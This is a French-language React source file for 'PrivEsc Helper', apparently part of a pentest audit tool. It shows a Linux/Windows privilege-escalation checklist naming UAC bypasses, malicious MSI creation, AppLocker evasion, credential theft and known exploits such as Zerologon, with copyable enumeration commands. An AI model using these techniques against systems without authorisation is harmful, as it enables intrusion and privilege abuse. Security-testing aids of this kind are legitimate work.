        { id: 'file_contents', label: 'Contenu de fichiers sensibles' },
        { id: 'browser_creds', label: 'Identifiants navigateur' },
        { id: 'wifi_creds', label: 'Identifiants WiFi' },
        { id: 'vault', label: 'Windows Vault' },
      ],
    },
    {
      id: 'contournement_uac',
      title: '05 - Contournement UAC',
      items: [
        { id: 'uac', label: 'UAC bypass (contexte applicatif)' },
        { id: 'fodhelper', label: 'Fodhelper.exe bypass' },
        { id: 'sdclt', label: 'sdclt.exe bypass' },
        { id: 'computerdefaults', label: 'ComputerDefaults.exe bypass' },
        { id: 'uac_bypass_tools', label: 'Outils de bypass UAC' },
      ],
    },
    {
      id: 'alwaysinstallelevated',
      title: '06 - AlwaysInstallElevated',
      items: [
        { id: 'alwaysinstall', label: 'AlwaysInstallElevated' },
        { id: 'msi_creation', label: 'Création de MSI malveillant' },
        { id: 'msi_execution', label: 'Exécution de MSI en SYSTEM' },
      ],
    },
    {
      id: 'evasion_env_restreints',
      title: '07 - Évasion environnements restreints',
      items: [
        { id: 'applocker', label: 'Contournement AppLocker' },
        { id: 'wdac', label: 'Windows Defender Application Control' },
        { id: 'powershell_constrained', label: 'PowerShell contraint' },
        { id: 'bypass_techniques', label: 'Techniques de bypass' },
      ],
    },
    {
      id: 'taches_planifiees',
      title: '08 - Tâches planifiées et démarrage auto',
      items: [
        { id: 'schtasks', label: 'Scheduled Tasks (schtasks)' },
        { id: 'startup_folders', label: 'Dossiers de démarrage' },
        { id: 'registry_startup', label: 'Registry de démarrage' },
        { id: 'wmi_events', label: 'Événements WMI' },
      ],
    },
    {
      id: 'exploitation_vulns',
      title: '09 - Exploitation vulnérabilités connues',
      items: [
        { id: 'eternal_blue', label: 'EternalBlue / SMBGhost' },
        { id: 'blue_screen', label: 'BlueKeep / RDP' },
        { id: 'printnightmare', label: 'PrintNightmare' },
        { id: 'zerologon', label: 'Zerologon' },
        { id: 'petitpotam', label: 'PetitPotam' },
      ],
    },
    {
      id: 'techniques_diverses',
      title: '10 - Techniques diverses',
      items: [
        { id: 'runas', label: 'RunAs / RunAsUser' },
        { id: 'token_manipulation', label: 'Manipulation de tokens' },
        { id: 'parent_process', label: 'Parent Process ID Spoofing' },
        { id: 'com_hijacking', label: 'COM Hijacking' },
        { id: 'dll_proxying', label: 'DLL Proxying' },
      ],
    },
  ],
};

const TechniqueModal: React.FC<{ 
  open: boolean; 
  onClose: () => void; 
  techniqueId: string; 
  mode: PrivescMode;
}> = ({ open, onClose, techniqueId }) => {
  if (!open) return null;
  
  const technique = DETAILS[techniqueId];
  if (!technique) return null;

  const getTechniqueIcon = (id: string) => {
    const icons: Record<string, string> = {
      uname: '🐧', id: '👤', proc: '⚙️', files: '📁', capabilities: '🔓',
      cron: '⏰', docker: '🐳', nfs: '💾', path: '🛤️', whoami: '🪟',
      systeminfo: 'ℹ️', net: '🌐', qfe: '🔧', dll_hijack: '🎯',
      unquoted: '📝', schtasks: '⏱️', alwaysinstall: '📦', seimpersonate: '🔄',
      backup: '💿', uac: '🚪'
    };
    return icons[id] || '🔍';
  };

  const getDifficultyColor = (id: string) => {
    const difficulties: Record<string, string> = {
      uname: 'text-green-400', id: 'text-green-400', proc: 'text-yellow-400',
      files: 'text-orange-400', capabilities: 'text-red-400', cron: 'text-orange-400',
      docker: 'text-red-400', nfs: 'text-orange-400', path: 'text-yellow-400',
      whoami: 'text-green-400', systeminfo: 'text-green-400', net: 'text-yellow-400',
      qfe: 'text-orange-400', dll_hijack: 'text-red-400', unquoted: 'text-orange-400',
      schtasks: 'text-orange-400', alwaysinstall: 'text-red-400', seimpersonate: 'text-red-400',
      backup: 'text-orange-400', uac: 'text-yellow-400'
    };
    return difficulties[id] || 'text-slate-400';
  };

  const getDifficultyLabel = (id: string) => {
    const difficulties: Record<string, string> = {
      uname: 'Facile', id: 'Facile', proc: 'Moyen', files: 'Difficile',
      capabilities: 'Très difficile', cron: 'Difficile', docker: 'Très difficile',
      nfs: 'Difficile', path: 'Moyen', whoami: 'Facile', systeminfo: 'Facile',
      net: 'Moyen', qfe: 'Difficile', dll_hijack: 'Très difficile', unquoted: 'Difficile',
      schtasks: 'Difficile', alwaysinstall: 'Très difficile', seimpersonate: 'Très difficile',
      backup: 'Difficile', uac: 'Moyen'
    };
    return difficulties[id] || 'Inconnue';
  };

  return createPortal(
    <div className="fixed inset-0 z-[1000]">
      <div className="absolute inset-0 bg-black/60" onClick={onClose} />
      <div className="absolute inset-0 flex items-center justify-center p-4">
        <div className="w-full max-w-4xl max-h-[90vh] bg-slate-900 border border-slate-700 rounded-xl shadow-xl overflow-hidden">
          <div className="flex items-center justify-between p-4 border-b border-slate-700 bg-slate-800">
            <div className="flex items-center gap-3">
              <span className="text-2xl">{getTechniqueIcon(techniqueId)}</span>
              <div>
                <div className="font-semibold text-slate-100 text-lg">{techniqueId}</div>
                <div className="text-sm text-slate-400">Technique d'escalade de privilèges</div>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <span className={`px-2 py-1 rounded text-xs font-medium ${getDifficultyColor(techniqueId)} bg-slate-700`}>
                {getDifficultyLabel(techniqueId)}
              </span>
              <button className="text-slate-400 hover:text-slate-200" onClick={onClose}>✕</button>
            </div>
          </div>
          
          <div className="p-6 space-y-6 overflow-y-auto max-h-[calc(90vh-80px)]">
            {/* Description */}
            <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
              <h3 className="text-slate-100 font-semibold mb-3 flex items-center gap-2">
                📖 Description
              </h3>
              <p className="text-slate-300 leading-relaxed">{technique.description}</p>
            </div>

            {/* Commandes d'énumération */}
            {technique.commands && technique.commands.length > 0 && (
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h3 className="text-slate-100 font-semibold mb-4 flex items-center gap-2">
                  💻 Commandes d'énumération
                </h3>
                <div className="space-y-4">
                  {technique.commands.map((cmd, idx) => (
                    <div key={idx} className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-sm font-medium text-slate-300">Commande {idx + 1}:</span>
                        <Button 
                          size="sm" 
                          variant="outline" 
                          onClick={() => copyText(cmd)} 
                          className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600 text-xs"
                        >
                          Copier
                        </Button>
                      </div>
                      <pre className="bg-slate-900 border border-slate-600 text-slate-200 text-sm p-3 rounded overflow-x-auto">
                        <code>{cmd}</code>
                      </pre>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Indicateurs de vulnérabilité */}
            {technique.lookFors && technique.lookFors.length > 0 && (
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h3 className="text-slate-100 font-semibold mb-4 flex items-center gap-2">
                  🔍 Indicateurs de vulnérabilité
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {technique.lookFors.map((item, idx) => (
                    <div key={idx} className="flex items-start gap-3 p-3 bg-red-900/20 border border-red-700/30 rounded-lg">
                      <span className="text-red-400 mt-1 text-sm">⚠️</span>
                      <span className="text-slate-300 text-sm">{item}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Signes de succès */}
            {technique.expected && technique.expected.length > 0 && (
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h3 className="text-slate-100 font-semibold mb-4 flex items-center gap-2">
                  ✅ Signes de succès
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {technique.expected.map((item, idx) => (
                    <div key={idx} className="flex items-start gap-3 p-3 bg-green-900/20 border border-green-700/30 rounded-lg">
                      <span className="text-green-400 mt-1 text-sm">✓</span>
                      <span className="text-slate-300 text-sm">{item}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Étapes d'exploitation */}
            <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
              <h3 className="text-slate-100 font-semibold mb-4 flex items-center gap-2">
                🎯 Étapes d'exploitation
              </h3>
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-3">
                    <div className="flex items-start gap-3 p-3 bg-blue-900/20 border border-blue-700/30 rounded-lg">
                      <span className="bg-blue-600 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center shrink-0 mt-0.5">1</span>
                      <div>
                        <div className="font-medium text-slate-200 text-sm mb-1">Énumération</div>
                        <div className="text-slate-300 text-xs">Exécuter les commandes d'énumération pour identifier la vulnérabilité</div>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 p-3 bg-blue-900/20 border border-blue-700/30 rounded-lg">
                      <span className="bg-blue-600 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center shrink-0 mt-0.5">2</span>
                      <div>
                        <div className="font-medium text-slate-200 text-sm mb-1">Analyse</div>
                        <div className="text-slate-300 text-xs">Analyser les résultats pour confirmer la présence de la vulnérabilité</div>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-3">
                    <div className="flex items-start gap-3 p-3 bg-orange-900/20 border border-orange-700/30 rounded-lg">
                      <span className="bg-orange-600 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center shrink-0 mt-0.5">3</span>
                      <div>
                        <div className="font-medium text-slate-200 text-sm mb-1">Exploitation</div>
                        <div className="text-slate-300 text-xs">Préparer et exécuter l'exploit approprié</div>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 p-3 bg-green-900/20 border border-green-700/30 rounded-lg">
                      <span className="bg-green-600 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center shrink-0 mt-0.5">4</span>
                      <div>
                        <div className="font-medium text-slate-200 text-sm mb-1">Vérification</div>
                        <div className="text-slate-300 text-xs">Vérifier l'élévation de privilèges obtenue</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Ressources supplémentaires */}
            <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
              <h3 className="text-slate-100 font-semibold mb-3 flex items-center gap-2">
                📚 Ressources supplémentaires
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <a href="https://book.hacktricks.xyz/" target="_blank" rel="noreferrer" className="text-blue-400 hover:underline flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600">
                  <ExternalLink className="w-4 h-4" /> HackTricks
                </a>
                <a href="https://gtfobins.github.io/" target="_blank" rel="noreferrer" className="text-blue-400 hover:underline flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600">
                  <ExternalLink className="w-4 h-4" /> GTFOBins
                </a>
                <a href="https://lolbas-project.github.io/" target="_blank" rel="noreferrer" className="text-blue-400 hover:underline flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600">
                  <ExternalLink className="w-4 h-4" /> LOLBAS
                </a>
                <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noreferrer" className="text-blue-400 hover:underline flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600">
                  <ExternalLink className="w-4 h-4" /> PEASS-ng
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>,
    document.body
  );
};

const PrivescPage: React.FC = () => {
  const [mode, setMode] = useState<PrivescMode>('linux');
  const { checklists, toggleItem, resetMode } = usePrivescStore();
  const [query, setQuery] = useState('');
  const [about, setAbout] = useState(false);
  const [selectedTechnique, setSelectedTechnique] = useState<string | null>(null);
  const fileRef = useRef<HTMLInputElement | null>(null);

  const themes = THEMES[mode];

  const filteredThemes = useMemo(() => {
    if (!query.trim()) return themes;
    const q = query.toLowerCase();
    return themes
      .map(t => ({
        ...t,
        items: t.items.filter(i => i.label.toLowerCase().includes(q) || i.id.toLowerCase().includes(q))
      }))
      .filter(t => t.items.length > 0);
  }, [themes, query]);

  const stateForMode = checklists[mode] || {};

  const exportJson = () => {
    const data = { mode, checklists };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = `privesc_${new Date().toISOString().slice(0,10)}.json`;
    document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
  };

  const importJson = (file: File) => {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const data = JSON.parse(String(reader.result));
        if (data?.checklists) {
          localStorage.setItem('privesc-store', JSON.stringify({ state: { checklists: data.checklists } }));
          window.location.reload();
        }
      } catch {}
    };
    reader.readAsText(file);
  };

  const linuxQuick: { label: string; cmd: string }[] = [
    { label: 'uname / lsb_release', cmd: 'uname -a; lsb_release -a 2>/dev/null' },
    { label: 'id / groups / sudo -l', cmd: 'id; groups; sudo -l 2>/dev/null' },
    { label: 'SUID/SGID', cmd: "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null" },
    { label: 'Capabilities', cmd: 'getcap -r / 2>/dev/null' },
    { label: 'Cron', cmd: 'crontab -l; ls -la /etc/cron*; systemctl list-timers' },
    { label: 'Docker group', cmd: 'id | grep -qi docker && echo "User in docker group"' },
  ];

  const windowsQuick: { label: string; cmd: string }[] = [
    { label: 'whoami /priv', cmd: 'whoami /all' },
    { label: 'systeminfo', cmd: 'systeminfo' },
    { label: 'Hotfix (qfe)', cmd: 'wmic qfe list full' },
    { label: 'Services (unquoted)', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"' },
    { label: 'Scheduled Tasks', cmd: 'schtasks /query /fo LIST /v' },
    { label: 'AlwaysInstallElevated', cmd: 'reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
  ];

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      {/* Header AuditMapper */}
      <div className="bg-slate-900 border-b border-slate-700 p-4">
        <div className="flex-between mb-4">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-3">
              <img src="/logo.png" alt="AuditMapper" className="w-8 h-8 rounded-lg opacity-80" />
              <div>
                <h1 className="text-2xl font-bold text-slate-100">PrivEsc Helper</h1>
                <p className="text-slate-400">Guide complet pour l'escalade de privilèges</p>
              </div>
            </div>
          </div>
          
          <div className="flex items-center gap-3">
            <div className="flex bg-slate-800 rounded-lg p-1">
              <Button 
                onClick={() => setMode('linux')} 
                className={`px-4 py-2 rounded-md transition-all ${
                  mode === 'linux' 
                    ? 'bg-blue-600 text-white shadow-lg' 
                    : 'bg-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                🐧 Linux
              </Button>
              <Button 
                onClick={() => setMode('windows')} 
                className={`px-4 py-2 rounded-md transition-all ${
                  mode === 'windows' 
                    ? 'bg-blue-600 text-white shadow-lg' 
                    : 'bg-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                🪟 Windows
              </Button>
            </div>
            
            <Button onClick={exportJson} variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600">
              <Download className="w-4 h-4 mr-2" /> Export
            </Button>
            <input ref={fileRef} type="file" accept="application/json" className="hidden" onChange={(e)=>{ const f=e.target.files?.[0]; if (f) importJson(f); }} />
            <Button onClick={()=>fileRef.current?.click()} variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600">
              <Upload className="w-4 h-4 mr-2" /> Import
            </Button>
            <Button onClick={() => resetMode(mode)} variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600">
              <RefreshCw className="w-4 h-4 mr-2" /> Reset
            </Button>
            <Button variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setAbout(true)}>
              <Info className="w-4 h-4 mr-2" /> Aide
            </Button>
          </div>
        </div>
      </div>

      {/* Contenu principal */}
      <div className="w-full px-4 py-6">
        <div className="grid grid-cols-1 xl:grid-cols-5 gap-6 max-w-none">
          {/* Sidebar gauche - Outils et recherche */}
          <div className="xl:col-span-1 space-y-6">
            {/* Barre de recherche */}
            <Card className="stats-card">
              <CardHeader className="pb-3">
                <CardTitle className="text-slate-100 flex items-center gap-2 text-lg">
                  <Search className="w-5 h-5" /> Recherche
                </CardTitle>
              </CardHeader>
              <CardContent>
                <Input 
                  value={query} 
                  onChange={(e)=>setQuery(e.target.value)} 
                  placeholder="Filtrer les techniques..." 
                  className="bg-slate-700 border-slate-600 text-slate-200 placeholder:text-slate-500" 
                />
              </CardContent>
            </Card>

            {/* Statistiques */}
            <Card className="stats-card">
              <CardHeader className="pb-3">
                <CardTitle className="text-slate-100 flex items-center gap-2 text-lg">
                  📊 Progression
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {filteredThemes.map(theme => {
                    const themeState = stateForMode[theme.id] || {};
                    const totalItems = theme.items.length;
                    const completedItems = Object.values(themeState).filter(Boolean).length;
                    const percentage = totalItems > 0 ? Math.round((completedItems / totalItems) * 100) : 0;
                    
                    return (
                      <div key={theme.id} className="space-y-2">
                        <div className="flex items-center justify-between text-sm">
                          <span className="text-slate-300 font-medium">{theme.title}</span>
                          <span className="text-slate-400 text-xs">{completedItems}/{totalItems}</span>
                        </div>
                        <div className="w-full bg-slate-700 rounded-full h-2">
                          <div 
                            className="bg-gradient-to-r from-blue-500 to-cyan-500 h-2 rounded-full transition-all duration-300" 
                            style={{ width: `${percentage}%` }}
                          ></div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </CardContent>
            </Card>

            {/* Commandes rapides */}
            <Card className="stats-card">
              <CardHeader className="pb-3">
                <CardTitle className="text-slate-100 flex items-center gap-2 text-lg">
                  <Clipboard className="w-5 h-5" /> Commandes rapides
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                {(mode==='linux'?linuxQuick:windowsQuick).map((c) => (
                  <div key={c.label} className="group">
                    <div className="text-xs text-slate-400 mb-1">{c.label}</div>
                    <div className="flex items-center gap-2">
                      <pre className="flex-1 bg-slate-900 border border-slate-600 text-slate-300 text-xs p-2 rounded overflow-x-auto">
                        <code>{c.cmd}</code>
                      </pre>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        onClick={()=>copyText(c.cmd)} 
                        className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600 opacity-0 group-hover:opacity-100 transition-opacity"
                      >
                        Copier
                      </Button>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>

            {/* Ressources */}
            <Card className="stats-card">
              <CardHeader className="pb-3">
                <CardTitle className="text-slate-100 flex items-center gap-2 text-lg">
                  📚 Ressources
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <a href="https://gtfobins.github.io/" target="_blank" rel="noreferrer" className="flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600 text-blue-400 hover:text-blue-300 transition-colors">
                  <ExternalLink className="w-4 h-4" /> GTFOBins
                </a>
                <a href="https://lolbas-project.github.io/" target="_blank" rel="noreferrer" className="flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600 text-blue-400 hover:text-blue-300 transition-colors">
                  <ExternalLink className="w-4 h-4" /> LOLBAS
                </a>
                <a href="https://book.hacktricks.xyz/" target="_blank" rel="noreferrer" className="flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600 text-blue-400 hover:text-blue-300 transition-colors">
                  <ExternalLink className="w-4 h-4" /> HackTricks
                </a>
                <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noreferrer" className="flex items-center gap-2 p-2 bg-slate-700 rounded hover:bg-slate-600 text-blue-400 hover:text-blue-300 transition-colors">
                  <ExternalLink className="w-4 h-4" /> PEASS-ng
                </a>
              </CardContent>
            </Card>
          </div>

          {/* Contenu principal - Techniques */}
          <div className="xl:col-span-4">
            <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
              {filteredThemes.map(theme => {
                const themeState = stateForMode[theme.id] || {};
                return (
                  <Card key={theme.id} className="stats-card hover:bg-slate-800/70 transition-all duration-200">
                    <CardHeader className="pb-4">
                      <CardTitle className="text-slate-100 flex items-center gap-2 text-xl">
                        <Wrench className="w-6 h-6 text-blue-400" /> {theme.title}
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      {theme.items.map(item => {
                        const checked = !!themeState[item.id];
                        const d = DETAILS[item.id] || {};
                        
                        return (
                          <div key={item.id} className="group relative">
                            <div className="p-5 rounded-lg border border-slate-600 bg-slate-700/30 hover:bg-slate-700/50 transition-all duration-200 h-full">
                              {/* Header avec checkbox et titre */}
                              <div className="flex items-start gap-3 mb-3">
                                <input
                                  type="checkbox"
                                  className="mt-1 w-4 h-4 text-blue-600 bg-slate-700 border-slate-500 rounded focus:ring-blue-500 focus:ring-2"
                                  checked={checked}
                                  onChange={()=>toggleItem(mode, theme.id, item.id)}
                                  title="Marquer comme vérifié"
                                />
                                
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-2 mb-1">
                                    <h4 className="text-slate-200 font-medium text-sm leading-tight">
                                      {item.label}
                                    </h4>
                                    {checked && (
                                      <span className="text-green-400 text-xs bg-green-400/10 px-2 py-1 rounded-full">
                                        ✓ Vérifié
                                      </span>
                                    )}
                                  </div>
                                  
                                  {d.description && (
                                    <p className="text-xs text-slate-400 leading-relaxed">
                                      {d.description}
                                    </p>
                                  )}
                                </div>
                              </div>

                              {/* Commandes d'énumération */}
                              {d.commands && d.commands.length > 0 && (
                                <div className="mb-4">
                                  <div className="flex items-center gap-2 mb-3">
                                    <span className="text-sm font-medium text-slate-300">Commandes d'énumération:</span>
                                  </div>
                                  <div className="space-y-3">
                                    {d.commands.slice(0, 2).map((cmd, idx) => (
                                      <div key={idx} className="flex items-center gap-3">
                                        <pre className="flex-1 bg-slate-900 border border-slate-600 text-slate-200 text-xs p-3 rounded overflow-x-auto">
                                          <code>{cmd}</code>
                                        </pre>
                                        <Button 
                                          size="sm" 
                                          variant="outline" 
                                          onClick={()=>copyText(cmd)} 
                                          className="bg-slate-600 border-slate-500 text-slate-200 hover:bg-slate-500 hover:border-slate-400 text-xs px-3 py-2"
                                        >
                                          Copier
                                        </Button>
                                      </div>
                                    ))}
                                    {d.commands.length > 2 && (
                                      <div className="text-xs text-slate-500 text-center">
                                        +{d.commands.length - 2} autres commandes...
                                      </div>
                                    )}
                                  </div>
                                </div>
                              )}

                              {/* Indicateurs de vulnérabilité */}
                              {d.lookFors && d.lookFors.length > 0 && (
                                <div className="mb-4">
                                  <div className="flex items-center gap-2 mb-3">
                                    <span className="text-sm font-medium text-slate-300">Indicateurs à chercher:</span>
                                  </div>
                                  <div className="flex flex-wrap gap-2">
                                    {d.lookFors.slice(0, 3).map((lookFor, idx) => (
                                      <span key={idx} className="text-xs bg-red-900/30 text-red-300 px-3 py-2 rounded border border-red-700/50">
                                        {lookFor}
                                      </span>
                                    ))}
                                    {d.lookFors.length > 3 && (
                                      <span className="text-xs text-slate-500 px-2 py-2">
                                        +{d.lookFors.length - 3} autres...
                                      </span>
                                    )}
                                  </div>
                                </div>
                              )}

                              {/* Boutons d'action */}
                              <div className="flex items-center gap-3 pt-4 border-t border-slate-600/50 mt-auto">
                                <Button 
                                  size="sm" 
                                  variant="outline" 
                                  onClick={() => setSelectedTechnique(item.id)}
                                  className="bg-slate-600 border-slate-500 text-slate-200 hover:bg-slate-500 hover:border-slate-400 text-xs px-4 py-2"
                                >
                                  📖 Détails complets
                                </Button>
                                
                                {d.commands?.[0] && (
                                  <Button 
                                    size="sm" 
                                    variant="outline" 
                                    onClick={()=>copyText(d.commands![0]!)} 
                                    className="bg-blue-600 border-blue-500 text-blue-100 hover:bg-blue-500 hover:border-blue-400 text-xs px-4 py-2"
                                  >
                                    💻 Copier première commande
                                  </Button>
                                )}
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </CardContent>
                  </Card>
                );
              })}
            </div>
          </div>
        </div>
      </div>

      <TechniqueModal 
        open={!!selectedTechnique} 
        onClose={() => setSelectedTechnique(null)} 
        techniqueId={selectedTechnique || ''} 
        mode={mode}
      />

      <InfoModal open={about} onClose={() => setAbout(false)} title="PrivEsc Helper – principes techniques">
        <ul className="list-disc ml-5 space-y-1">
          <li><strong>State</strong>: checklist persistée en localStorage via store (Zustand).</li>
          <li><strong>UI</strong>: React + Tailwind; cartes thématiques, actions copier, import/export JSON.</li>
          <li><strong>Sans backend</strong>: tout est client.</li>
        </ul>
      </InfoModal>
    </div>
  );
};

export default PrivescPage;
